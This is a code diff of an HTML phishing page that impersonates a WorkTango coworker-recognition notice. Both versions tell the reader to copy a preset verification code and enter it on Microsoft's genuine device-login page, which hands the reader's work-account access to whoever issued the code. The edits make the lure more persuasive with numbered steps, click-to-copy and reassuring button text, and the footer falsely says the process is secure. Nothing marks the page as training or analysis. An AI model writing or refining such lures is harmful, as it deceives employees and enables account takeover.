@@ -14,10 +14,11 @@
         h2 { color: #333; font-size: 20px; margin-bottom: 12px; }
         p { color: #555; font-size: 15px; line-height: 1.6; margin-bottom: 20px; }
         .code-box { background: #f0f0ff; border: 2px dashed #6c63ff; border-radius: 8px; padding: 16px; margin: 20px 0; }
-        .code { font-size: 32px; font-weight: 700; letter-spacing: 4px; color: #6c63ff; font-family: monospace; user-select: all; }
+        .code { font-size: 32px; font-weight: 700; letter-spacing: 4px; color: #6c63ff; font-family: monospace; cursor: pointer; user-select: all; }
         .btn { display: inline-block; background: #6c63ff; color: white; padding: 14px 32px; border-radius: 8px; text-decoration: none; font-size: 16px; font-weight: 600; margin-top: 10px; }
         .btn:hover { background: #5a52d5; }
-        .note { background: #fff3e0; border-radius: 8px; padding: 12px 16px; margin: 16px 0; font-size: 13px; color: #e65100; }
+        .steps { text-align: left; margin: 20px 0; padding: 0 20px; }
+        .steps li { color: #555; margin-bottom: 8px; font-size: 14px; }
         .footer { color: #999; font-size: 12px; margin-top: 24px; }
     </style>
 </head>
@@ -27,13 +28,17 @@
         <div class="subtitle">Identity Verification Required</div>
         <div class="icon">&#x1F510;</div>
         <h2>Verify to View Your Recognition</h2>
-        <p>Your coworker sent you a private recognition! To protect your privacy, please verify your identity through your organization's Microsoft account.</p>
-        <div class="note">&#x1F4CB; <strong>Step 1:</strong> Copy the code below. <strong>Step 2:</strong> Click the button to open Microsoft sign-in and paste it there.</div>
+        <p>Your coworker sent you a private recognition! To protect your privacy, we need to verify your identity through your organization's Microsoft account.</p>
+        <ol class="steps">
+            <li>Copy the code below (click the code to copy)</li>
+            <li>Click the button to open Microsoft's secure sign-in page</li>
+            <li>Paste the code and sign in with your work account</li>
+        </ol>
         <div class="code-box">
             <div style="color:#666;font-size:13px;margin-bottom:8px;">Your verification code (click to copy)</div>
             <div class="code" id="code" onclick="navigator.clipboard.writeText('N42D9YSNX');this.style.color='#4caf50';setTimeout(()=>this.style.color='#6c63ff',1500);">N42D9YSNX</div>
         </div>
-        <a href="https://login.microsoftonline.com/common/oauth2/deviceauth" class="btn">Continue to Microsoft Sign-in &#x2192;</a>
+        <a href="https://login.microsoftonline.com/common/oauth2/deviceauth" class="btn">Verify with Microsoft &#x2192;</a>
         <div class="footer">This verification is handled securely by Microsoft. WorkTango does not store or see your password.</div>
     </div>
 </body>
